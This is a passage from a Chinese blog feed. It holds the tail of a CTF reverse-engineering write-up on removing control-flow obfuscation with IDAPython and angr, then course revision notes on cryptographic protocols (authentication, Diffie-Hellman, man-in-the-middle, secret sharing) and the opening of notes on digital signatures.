class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_214);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_266);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_369);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_417);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_527);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_622);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_733);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_847);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_942);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1054);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1106);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1222);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1336);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1441);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1540);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1589);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1686);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1796);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1891);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1996);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2112);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2165);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2260);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2336);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2412);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2498);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2575);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::length(v9) - <span class="hljs-number">1LL</span> != legend &gt;&gt; <span class="hljs-number">2</span> )<br>  &#123;<br>    *v6 = legend &gt;&gt; <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-built_in">string</span>(v5, v9);<br>    v3 = sanitize_input(v5);<br>    *v6 = v3;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::~<span class="hljs-built_in">string</span>(v5);<br>  &#125;<br>  <span class="hljs-keyword">return</span> *v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是运行完，清除<code>start_quest</code>混淆后的效果，可以发现效果不错，而且与之前IDApython的结果不能说差不多吧，只能说一模一样。因为这二者的思路本质上都是一样的，殊途同归了属于是</p><h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>清除混淆后的步骤就比较简单了，虽然它还有一个变量名混淆，就是一个变量赋值来赋值去的，不过这个直接使用IDA的变量重命名就能轻松搞定了。</p><p>对比一下可以发现，IDApython的脚本简洁明了，运行速度也快于Angr，但它的缺点就是在面对复杂情况下的混淆可能就有点乏力，比如这几个变量不再初始为0，而是随机的初始值，可能就得费一番功夫去修改脚本了。而Angr的优势在于它的准确性，因为它就是实打实的去跑，去探索究竟哪一个块是可达的，哪一个块是不可达的，即使面对复杂的控制流混淆，这一本质是仍是通用的。</p><p>二者各有优劣，但都很精彩。</p><p>（当然这题也可以直接符号执行出flag，但是这显然就学不到什么了）</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
      <tag>idapython</tag>
      
      <tag>debogus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第七章 密码协议</title>
    <link href="/2023/06/01/cryptographic%20protocol/"/>
    <url>/2023/06/01/cryptographic%20protocol/</url>
    
    <content type="html"><![CDATA[<p>急急急 期末预习急急急</p><span id="more"></span><h2 id="密码协议概述"><a href="#密码协议概述" class="headerlink" title="密码协议概述"></a>密码协议概述</h2><ul><li>协议是一种有序过程，每一步必须以此执行；需要至少两个或两个以上的参与者，且最终要完成某种任务，即实现某种功能</li><li>协议对参与者一定是完全 <em><strong>公开</strong></em> 的，且 <em><strong>按照规范</strong></em> 动作</li><li>协议的基本要求是 <em><strong>有效性、公平性、完整性</strong></em></li><li>密码协议也叫 <em><strong>安全协议</strong></em>，是建立在 <em><strong>密码</strong></em> 体制的基础上的一种 <em><strong>交互式通信协议</strong></em> ，借助于密码算法来达到安全功能</li><li>密码协议所能实现的安全功能是多种多样的<ul><li>身份认证、密钥协商、消息 鉴别、公平抛币</li><li>多方计算、秘密共享、不经意传输</li><li>零知识证明</li></ul></li><li>密码协议的应用<ul><li>安全通信</li><li>电子选举</li><li>电子拍卖</li><li>公平电子交易</li></ul></li></ul><h2 id="认证协议"><a href="#认证协议" class="headerlink" title="认证协议"></a>认证协议</h2><h3 id="认证协议概述"><a href="#认证协议概述" class="headerlink" title="认证协议概述"></a>认证协议概述</h3><ul><li><p>认证：一个实体向另一个实体 <em><strong>证明</strong></em> 某种声称的东西过程</p></li><li><p>认证协议：主要目标是确认某个主体的真实性，确保信息的安全性</p></li><li><p>安全可靠的通信 <em><strong>除需进行消息的认证</strong></em> 外，还需 <em><strong>建立一些规范的协议</strong></em> 对 <em><strong>数据来源的可靠性，通信实体的真实性加以认证，以防止欺骗、伪装等攻击</strong></em></p></li><li><p>认证的分类</p><ul><li><em><strong>身份认证</strong></em>： 也称实体认证，验证消息发送者所声称的身份，发起通信或访问的实体是否具有合法身份和相应权限</li><li><em><strong>密钥建立认证</strong></em>：生成、获得加解密密钥</li><li><em><strong>数据源认证</strong></em>： 验证消息与其发送主体的一致性，数据从哪来</li><li><em><strong>消息完整性认证</strong></em>： 验证消息是否被篡改</li></ul></li><li><p>这些认证通常一起进行，也有时单独进行</p><ul><li>即通信及之前首先进行实体认证（身份认证），身份认证之后会协商出会话密钥用于对每个传输数据的数据源认证和完整性认证</li></ul></li></ul><h3 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h3><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><ul><li>身份认证有两个层次：身份证实 和 身份识别 二者差别是是否出示身份<ul><li>身份证实：你是否是你宣称的你，一般的身份认证都是指这种情况<ul><li>验证方首先知道要验证的身份是谁，进一步来证实来访问与之通信的人是否具有该身份</li><li>一般用于A和B确定通信时所用，通常的网络认证协议都是身份证实</li><li>具体技术：<em><strong>输入个人信息，经公式或算法运算所得结果与卡中或数据库中存储信息经公司和运算所结果比较</strong></em></li></ul></li><li>身份识别：我是否知道你是谁<ul><li>验证方不知道来访人是否为合法身份，没有比较确定的目标，<em><strong>只要满足某个条件就可判定身份的特点</strong></em>，验证者一般为权威机构</li><li>一般在实体认证中需要，比如判断来访者是否是在逃犯，是否为密码开启者，是否为本公司员工。通常用 <em><strong>指纹、虹膜技术</strong></em></li><li>具体技术： <em><strong>输入个人信息，经过处理提取模板信息，试着在存储数据库中找出一个与之匹配的模板而后得出结论</strong></em></li></ul></li></ul></li><li>主要验证用户 <em><strong>知道什么</strong></em> 如口令、密钥、私钥、秘密等，验证用户 <em><strong>拥有什么</strong></em>  如IC卡，验证用户 <em><strong>具有什么特征</strong></em> 如指纹、掌纹、虹膜、DNA等<ul><li>基于口令的身份认证是比较重要的一类，具有广泛的应用，因为用户不需要携带或记忆复杂的密钥或认证消息</li></ul></li></ul><h4 id="数据源认证和消息完整性认证的区别"><a href="#数据源认证和消息完整性认证的区别" class="headerlink" title="数据源认证和消息完整性认证的区别"></a>数据源认证和消息完整性认证的区别</h4><ul><li><p>数据源认证 <em><strong>一定</strong></em> 涉及通信，是一种安全服务</p><p>消息完整性认证 <em><strong>不一定</strong></em> 涉及通信，可用于存储的数据</p></li><li><p>数据源认证 <em><strong>一定</strong></em> 涉及消息源识别</p><p>而消息完整性 <em><strong>不一定</strong></em> 涉及该过程</p><p>比如用户A将一个由用户C签名的消息文件发给用户B，那么用户B能够通过验证C的签名判断消息完整性，但是消息的来源却不是C而是A</p></li><li><p>数据源认证 <em><strong>一定</strong></em> 涉及确认消息的新鲜性</p><p>而数据完整性却 <em><strong>无此必要</strong></em></p><p>比如一组老的数据，或者重放的数据可能由完善的数据完整性，而是数据源认证要求确认收到的消息是新鲜的，即是当前新发送的，而不是旧消息的重放</p><h4 id="认证需求"><a href="#认证需求" class="headerlink" title="认证需求"></a>认证需求</h4></li><li><p>有的协议只需要认证身份</p></li><li><p>有的协议除了认证身份还需要建立之后通信的密钥以保护通信安全，即身份认证与密钥协商（密钥建立确认协议）</p></li><li><p>有的协议主要考虑对消息源的认证，这时一般首先要认证身份并建立密钥，然后再基于该会话密钥对传输的每个消息进行认证，以使收方确信收到的消息来自发方，而且不是重放，在顺序、时间等方面都是正确的，即完整性</p></li></ul><h4 id="常见攻击"><a href="#常见攻击" class="headerlink" title="常见攻击"></a>常见攻击</h4><ul><li>常见针对认证和密钥建立协议的攻击<ul><li>重放攻击 Replay attack</li><li>中间人攻击 Man-in-the-middle</li><li>已知密钥攻击 从以前用过的密钥确定新密钥</li><li>假冒攻击 Impresonation attack</li><li>篡改或替换</li><li>字典攻击 Dictionary attack 针对口令的一类攻击</li><li>拒接服务攻击</li></ul></li></ul><h2 id="基本认证技术"><a href="#基本认证技术" class="headerlink" title="基本认证技术"></a>基本认证技术</h2><ul><li>证明消息的新鲜性和主体活现性的标准机制</li><li>双向认证和单向认证</li><li>包含可信第三方的认证</li></ul><h3 id="消息的新鲜性和主体的活现性"><a href="#消息的新鲜性和主体的活现性" class="headerlink" title="消息的新鲜性和主体的活现性"></a>消息的新鲜性和主体的活现性</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li>消息的新鲜性，即实时性是数据源认证所不可或缺的一部分，而在这一过程中主体也要考虑 <em><strong>通信对端的身份真实性</strong></em> 以及 <em><strong>是否在线，即主体活现性</strong></em> ，因此证明消息的新鲜性或主体的活现性就成为认证协议的最基本组成部分</li><li>消息的新鲜性经常伴随着主体活现性的认证，因为以新鲜性讨论为主</li><li><em><strong>消息的新鲜性也称为实时性</strong></em></li><li>新鲜性（实时性）对防治消息的重放攻击极为重要，一种方法是对交换的每一条消息都加上一个<em><strong>序列号</strong></em>，一个新消息仅当它有正确的序列号才被接收。这种方法的困难性是要求 <em><strong>每个用户分别记录</strong></em> 与其他每一用户交换的消息序列号，增加用户负担，因此 <em><strong>序列号方法一般不用于认证和密钥交换</strong></em></li></ul><h4 id="两种实现消息新鲜性的技术"><a href="#两种实现消息新鲜性的技术" class="headerlink" title="两种实现消息新鲜性的技术"></a>两种实现消息新鲜性的技术</h4><ul><li><p>由两种方式实现消息新鲜性：时间戳 和 询问应答机制</p><ul><li><p>时戳：</p><p>如果A消息收到的消息包括时戳，且在A看来这一时戳充分接近自己的当前时刻，A才认为收到的消息是新的并接受之，这种方案 <em>要求所有各方的时钟是同步的</em></p></li><li><p>询问-应答：</p><p>用户A向B发出一个 <em>一次性随机数作为询问</em> ，如果B收到发来的消息（应答），也包含一正确的一次性随机数，A就认为B发来的消息是新的并接受之</p></li></ul></li><li><p>缺点</p><ul><li>时间戳不能用于面向链接的应用过程<ul><li>这是由于 <em>时戳法在实现时固有的困难性</em></li><li>首先是需要在 <em>不同的处理器时钟之间保持同步</em> ，那么 <em>所用的协议必须是容错的以处理网络错误</em> ，并且是安全的以对付恶意攻击</li><li>第二，如果 <em>协议中任一方的时钟出现错误而暂时失去了同步</em> ，则将使敌手攻击成功的可能性增加</li><li>最后还由于 <em>网络本身存在延迟</em> ，因此不能期望协议的各方能保持精确的同步。 所以任何基于时戳的处理过程、协议等都 <em>必须允许同步有一个误差范围</em> ，<em><strong>考虑到网络本身的延迟</strong></em>， <em>误差范围应足够大</em> ，<em><strong>考虑到可能存在攻击</strong></em>， <em>误差范围又应该足够小</em></li></ul></li><li>询问-应答方式则不适合于无连接的应用过程<ul><li>这是因为无连接传输以前需经询问-应答这一额外握手过程，这与无连接应用过程的本质特性不符</li><li>对于无连接的应用程序来说，利用某种安全的 <em>时间服务器</em> 保持各方始终同步是防止重放攻击最好的方法</li></ul></li><li>关于有状态和无状态的协议<ul><li>如果协议的运行需要一些历史和当前的状态作为上下文来维护，则称为有状态的协议，这样一次协议的运行要考虑历史的状态，会造成负担或者失同步的问题</li><li>如果每次协议运行独立于历史状态参数，则是无状态的，实现和资源占用更少</li></ul></li></ul></li></ul><h3 id="双向认证和单向认证"><a href="#双向认证和单向认证" class="headerlink" title="双向认证和单向认证"></a>双向认证和单向认证</h3><ul><li><p>A 和 B是网络的两个用户 ，他们想过网络先建立安全的共享密钥在进行保密通信</p><p><em>A 和 B 如何确信自己正在和通信的人是 B 和 A 而不是 C呢？</em> 即双方的身份认证</p></li><li><p>这种通信方式为 <em>双向通信</em> ，此时的认证称为 <em>相互认证</em></p><p><em>双向认证也叫相互认证 双方认证等</em></p></li><li><p>类似地 对于 <em>单向通信</em> 来说，认证称为 <em>单向认证</em></p></li></ul><h3 id="包含可信第三方的认证"><a href="#包含可信第三方的认证" class="headerlink" title="包含可信第三方的认证"></a>包含可信第三方的认证</h3><ul><li>A 和 B 直接进行认证的前提是二者之间具有共享的密钥，有时在实际应用中，这种方式并不实用，因为用户多是两两用户之间都要共享密钥，因此一种更为常见的方式是基于可信第三方的认证</li><li>这时，双方都与可信第三方共享初始密钥，系统扩展性好，便于密钥管理，借助可信第三方提供的帮助来实现认证和密钥协商</li><li>可信第三方可以在线也可以离线</li></ul><h4 id="建立共享密钥"><a href="#建立共享密钥" class="headerlink" title="建立共享密钥"></a>建立共享密钥</h4><ul><li><p>A 和 B 两个用户在 <em>建立共享密钥时</em> 需要考虑的核心问题是 <em><strong>保密性和实时性</strong></em></p></li><li><p>保密性： 为防止会话密钥的伪造或泄露，<em>会话密钥在通信双方之间交换时应为密文形式，所以通信双方事先就应该有密钥或公开钥</em></p></li><li><p>实时性即新鲜性，可使用前述的基本认证技术（时间戳 and 询问-应答）</p></li><li><p>通信双方建立共享密钥时可采用 <em>对称密钥加密体制</em> 和 <em>公钥加密体制</em></p></li></ul><h3 id="基于公钥加密和会话密钥的分配协议"><a href="#基于公钥加密和会话密钥的分配协议" class="headerlink" title="基于公钥加密和会话密钥的分配协议"></a>基于公钥加密和会话密钥的分配协议</h3><ul><li>由于 <em>公钥加密的速度过慢</em> ，因此进行保密通信不太合适，但 <em>用于分配对称密钥密码体制的密钥却非常合适</em></li></ul><h4 id="密钥分配"><a href="#密钥分配" class="headerlink" title="密钥分配"></a>密钥分配</h4><ul><li><p>下图表示简单使用公钥加密算法建立会话密钥过程，如果A希望与B通信，可通过以下几步建立会话密钥</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306161524512.png"></p></li></ul><ol><li>A产生自己的一对密钥$\lbrace PK_A,SK_A \rbrace$, 并向B发送 $PK_A \left| \right| ID_A$,其中$ID_A$ 表示A的身份</li><li>B产生会话密钥 $K_S$ ,并用A的公开钥 $PK_A$ 对 $K_S$ 加密后发往A</li><li>A由 $D_{SKA} \left[E_{PK_A} \left[K_S \right]\right]$ 恢复密钥，因为只有A能解读 $K_S$ ，所以仅A和B知道这一共享密钥</li><li>A销毁 $\lbrace PK_A SK_A \rbrace$ ,B销毁 $PK_A$</li></ol><ul><li>A、B现在可以用单钥加密算法以 $K_S$ 作为会话密钥进行保密通信，通信完成后，又都将 $K_S$ 销毁</li><li>这种分配方法尽管简单，但却由于A、B双方在通信前和完成通信后，<em>都未存储密钥</em> 因此，<em>密钥泄露的危险性为最小，且可以防止双方的通信被敌手监听</em><ul><li>每次公私钥由发方临时产生</li></ul></li><li>但由于公钥缺少证书管理机构认证且非物理传输容易受到主动攻击</li></ul><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><p>如果敌手E已接入A、B双方的通信信道，就可通过以下不被察觉的方式截获双方的通信：</p><ol><li><p>E截获A的发送后，建立自己的一对密钥 $\lbrace PK_E,SK_E\rbrace$, 并将 $PK_E \left| \right | ID_A$ 发送给B</p><p>即把原本要发送的$PK_A$ 替换为$PK_E$</p></li><li><p>B产生会话密钥 $K_S$ 后，将 $E_{PKE}\left[K_S \right]$ 发送出去</p></li><li><p>E截获B发送的消息后，由 $D_{PKE} \left[ E_{PK_E}\left[ K_S\right] \right]$ 解读出 $K_S$</p></li><li><p>E再将 $E_{PK_A}\left[K_S \right]$ 发送 A</p></li></ol><p>现在A和B知道 $K_S$ ，但并未意识到 $K_S$ 已被E截获，A、B在用$K_S$ 通信时，E就可以实时监听</p><h2 id="Diffie-Hellman-密钥交换"><a href="#Diffie-Hellman-密钥交换" class="headerlink" title="Diffie-Hellman 密钥交换"></a>Diffie-Hellman 密钥交换</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><ul><li><p>密钥交换是实现安全通信的基础</p><p>商用加密算法AES和DES需要在安全通信之前，实现通信双方的密钥共享</p></li><li><p>密钥交换的方法</p><ul><li>基于RSA的密钥交换</li><li>基于KDC技术（Key Distributed Center，密钥分发中心)</li><li><em><strong>Diffile-Hellman密钥交换（简称：DH算法）</strong></em></li><li>基于物理层的密钥交换</li></ul></li><li><p>DH算法是不安全信道下实现安全密钥共享的一种方法，由 W.Diffie 和 M.Hellman 在1976年提出的第一个公开的公钥密码算法</p></li></ul><h3 id="交换流程"><a href="#交换流程" class="headerlink" title="交换流程"></a>交换流程</h3><ul><li>用户A和B协商一个<em><strong>素数p</strong></em>，以及该素数的<em><strong>本原元g</strong></em></li><li>用户A选择一个随机数 $x，x&lt;p$ ，用户B选择一个随机数 $y，y&lt;p$</li><li>用户A计算 $Y_A &#x3D; g^x \bmod p$ ，用户B计算 $Y_B &#x3D; g^y \bmod p$ </li><li>用户A，用户B交换 $Y_A$ ，$Y_B$</li><li>用户A计算密钥 $K &#x3D; {Y_B}^x &#x3D; g^{xy} \bmod p$ 用户B计算密钥 $K &#x3D; {Y_A}^y &#x3D; g^{xy} \bmod p$</li><li>完成密钥协商</li></ul><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306161606279.png"></p><ul><li>例子<ul><li>假设素数 $p &#x3D; 97$ ，其本原元 $g&#x3D;5$</li><li>用户A选取随机数 $x&#x3D;36$ ，用户B选取随机数 $ x&#x3D; 58 $</li><li>用户A计算：$Y_A \equiv g^x \equiv 5^{36}  \equiv 50 \bmod  97 $</li><li>用户B计算：$Y_B \equiv g^y \equiv 5^{58}\equiv 44 \bmod 97 $</li><li>交换 $Y_A$ ，$Y_B$</li><li>用户A计算密钥：$K \equiv {Y_B}^x \equiv g^{xy} \equiv 44^{36}  \equiv 75\bmod 97$</li><li>用户B计算密钥：$K \equiv {Y_A}^y \equiv g^{xy} \equiv 50^{58}  \equiv 75\bmod 97$</li></ul></li></ul><h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><h4 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h4><ul><li><p>公开可截获的信息 <em><strong>素数 $p$<em><strong>、</strong></em>本原元 $ g $</strong></em> 、中间值 $Y_A$ $Y_B$</p></li><li><p>若攻击者想要获取密钥 $K$ 必须通过<br>$ Y_A \equiv g^x \bmod p $ 和 $ Y_B \equiv g^y \bmod p $</p><p>计算出 $x$ 和 $y$ ，然而这是一个很困难的问题</p></li><li><p>因此，算法的安全性基求于离散对数的困难性</p></li></ul><h4 id="其余安全问题"><a href="#其余安全问题" class="headerlink" title="其余安全问题"></a>其余安全问题</h4><ul><li>容易遭受阻塞攻击：因为幂运算时计算密性的，当敌手发起大量的密钥请求，受攻击者将花费大计算资源来做幂运算</li><li>容易遭受 <em><strong>中间人攻击</strong></em> ：敌手可分别冒充用户A和用户B中的一方，与另一方交换密钥，从而实现监听</li></ul><h4 id="中间人攻击-1"><a href="#中间人攻击-1" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><ul><li><p>现有用户A 、用户B  、中间人C</p></li><li><p>用户A 、用户B 正常协商一个 <em><strong>素数</strong></em> $p$ ,<em><strong>本原元</strong></em> g </p></li><li><p>用户A 、用户B 正常选择自己的随机数 $x$ , $y$ ，并计算 </p><p>$Y_A \equiv g^x \bmod p$ 和 $Y_B \equiv g^y \bmod p$</p></li><li><p>中间人C 选择随机数 $z$ ,计算 $Y_C \equiv g^Z \bmod p$ </p></li><li><p>中间人截获用户A传递的 $Y_A$ </p><ul><li>利用 $Y_A$ 计算 $K_{AC} \equiv {Y_A}^z \equiv g^{xz} \bmod p$</li><li>并将 $Y_C$ 传给用户B</li><li>用户B根据 $Y_C$ 计算 $K_{BC} \equiv {Y_C}^y \equiv g^{yz}\bmod p$</li></ul></li><li><p>中间人截获用户B传递的 $Y_B$ </p><ul><li>利用 $Y_B$ 计算 $K_{BC} \equiv {Y_B}^z \equiv g^{yz} \bmod p$</li><li>并将 $Y_C$ 传给用户A</li><li>用户A根据 $Y_C$ 计算 $K_{AC} \equiv {Y_C}^x \equiv g^{xz}\bmod p$</li></ul></li><li><p>此时用户A以为共享密钥是 $K_{AC}$ ,用户B以为共享密钥是 $K_{BC}$ ，而中间人拥有 $K_{AC}$ ， $K_{BC}$ ，可以监听用户A和用户B</p></li></ul><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306161740612.png"></p><h2 id="秘密共享"><a href="#秘密共享" class="headerlink" title="秘密共享"></a>秘密共享</h2><p>问题引入：</p><ul><li>保险柜的开启 <ul><li>保险柜中存放有10个人的共有财产 </li><li>要从保险柜中取出物品，必须有 <em><strong>半数以上</strong></em> 的人在场才可取出，半数以下则不行</li><li>如何构造锁的设计方案</li></ul></li><li>导弹控制发射，重要场所通行检验，通常需要多人同时参与才能生效，需要将秘密分为多人掌管，并且由<em><strong>一定</strong></em> 掌管秘密的人数同时到场才能恢复秘密</li></ul><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><ul><li><p>定义</p><p>秘密 <em>s</em> （通过某种方案）被分割成n个部分，每个部分称为 <em><strong>份额（share）</strong></em> 或 <em><strong>影子（shadow）</strong></em> ，由一个参与者持有，使得： </p><ul><li>由 <em><strong>k</strong></em> 个或多于 <em><strong>k</strong></em> 个参与者所持有的部分信息可重构 <em>s</em> 。 </li><li>由少于 <em><strong>k</strong></em> 个参与者所持有的部分信息则无法重构 <em>s</em> 。 </li><li>称该方案为 <em><strong>$(k，n)$ 秘密分割门限方案</strong></em> ，<em>k</em> 称为门限值，少于 <em><strong>k</strong></em> 个参与者所持有的部分信息得不到 <em>s</em> 任何信息称该 <em><strong>门限方案是完善的</strong></em></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>SYSU</category>
      
      <category>Crypt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第六章 数字签名</title>
    <link href="/2023/05/30/Digital%20Signature/"/>
    <url>/2023/05/30/Digital%20Signature/</url>
    
    <content type="html"><![CDATA[<p>急急急 期末预习急急急</p><span id="more"></span><h2 id="数字签名基本概念"><a href="#数字签名基本概念" class="headerlink" title="数字签名基本概念"></a>数字签名基本概念</h2><h3 id="数字签名概念"><a href="#数字签名概念" class="headerlink" title="数字签名概念"></a>数字签名概念</h3><ul><li><p>使用 <em>公钥</em> 加密技术实现，用于 <em>鉴别数字信息与签名者身份</em> 的方法</p></li><li><p>以 <em>电子方式</em> 存储签名信息，在 <em>数字文档</em> 上身份验证。 接收者和第三方能够 <em>验证</em> 文档 <em>来自</em> 签名者，并且文档签名后 <em>没有被修改</em>，</p></li></ul><p>签名者也 <em>不能否认</em> 对文档的签名</p><p>数字签名必须保障：</p><p>（1） 接收者能够 <em>核实</em> 发送者对文档的签名</p><p>（2） 发送者事后 <em>不能否认</em> 对文档的签名</p><p>（3） <em>不能伪造</em> 对文档的签名</p><h3 id="数字签名载体"><a href="#数字签名载体" class="headerlink" title="数字签名载体"></a>数字签名载体</h3><ul><li>一个签名有 <em>消息</em> 和 <em>载体</em> 两个部分，即签名所表示的 <em>意义</em> 和签名的 <em>物理表现形式</em></li></ul><h4 id="传统签名-VS-数字签名"><a href="#传统签名-VS-数字签名" class="headerlink" title="传统签名 VS 数字签名"></a>传统签名 VS 数字签名</h4><ul><li>传统签名中，签名与文件是一个 <em>物理整体</em><ul><li>具有 <em>共同</em> 的载体</li><li>物理上的 <em>不可分割</em> <em>不可复制</em> 的特性</li><li>签名与文件的 <em>不可分割</em> 和 <em>不能重复</em> 使用</li></ul></li><li>数字签名中，签名与文件是电子形式<ul><li><em>没有固定的物理载体</em> 即签名与文件的物理形式和消息已经分开</li><li>电子载体是可以 <em>任意分割</em> <em>复制</em> 的</li></ul></li><li>传统签名的验证是通过 <em>与存档手迹对照来确定真伪的</em> 是 <em>主观的、模糊的、容易伪造的</em> ，从而也是 <em>不安全的</em></li><li>数字签名则使用 <em>密码</em> ，通过 <em>公开算法可以检验的</em> ，是<em>客观的、精确的、在计算上的是安全的</em></li></ul><h4 id="传统签名基本特点："><a href="#传统签名基本特点：" class="headerlink" title="传统签名基本特点："></a>传统签名基本特点：</h4><ul><li>能与被签文件在物理上 <em>不可分割</em></li><li>签名者 <em>不能否认</em> 自己的签名</li><li>签名 <em>能被伪造</em></li><li><em>容易</em> 被验证</li></ul><h4 id="数字签名是传统签名的数字化，要求："><a href="#数字签名是传统签名的数字化，要求：" class="headerlink" title="数字签名是传统签名的数字化，要求："></a>数字签名是传统签名的数字化，要求：</h4><ul><li>能与所签文件 <em>绑定</em></li><li>签名者 <em>不能否认</em> 自己的签名</li><li>签名 <em>不能被伪造</em></li><li>容易 <em>被自动</em> 验证</li></ul><h4 id="数字签名应具有的特性"><a href="#数字签名应具有的特性" class="headerlink" title="数字签名应具有的特性"></a>数字签名应具有的特性</h4><p>（1） 签名是可信的：任何人可验证前面的有效性</p><p>（2） 签名是不可伪造的：除合法签名者外，其他人伪造签名是困难的</p><p>（3） 签名是不可复制的： 一消息的签名不能复制为另一消息的签名</p><p>（4） 签名的消息是不可改变的：经签名的消息不能被篡改</p><p>（5） 签名是不可抵赖的： 签名者事后不能否认自己的签名</p><p><em>数字签名： 对身份认证，保持数据完整性，不可否认性</em></p><p><em>MAC： 可对身份认证，保持数据完整性，但不具有不可否认性</em></p><h2 id="数字签名的构成"><a href="#数字签名的构成" class="headerlink" title="数字签名的构成"></a>数字签名的构成</h2><h3 id="数字签名方案的构成"><a href="#数字签名方案的构成" class="headerlink" title="数字签名方案的构成"></a>数字签名方案的构成</h3><p>一个数字签名方案包括如下三个算法：</p><ul><li>密钥生成：产生用户的公私钥</li><li>签名算法：产生消息的签名</li><li>验证算法：验收消息的签名是否合法</li></ul><h2 id="数字签名的需求"><a href="#数字签名的需求" class="headerlink" title="数字签名的需求"></a>数字签名的需求</h2><h3 id="需满足条件"><a href="#需满足条件" class="headerlink" 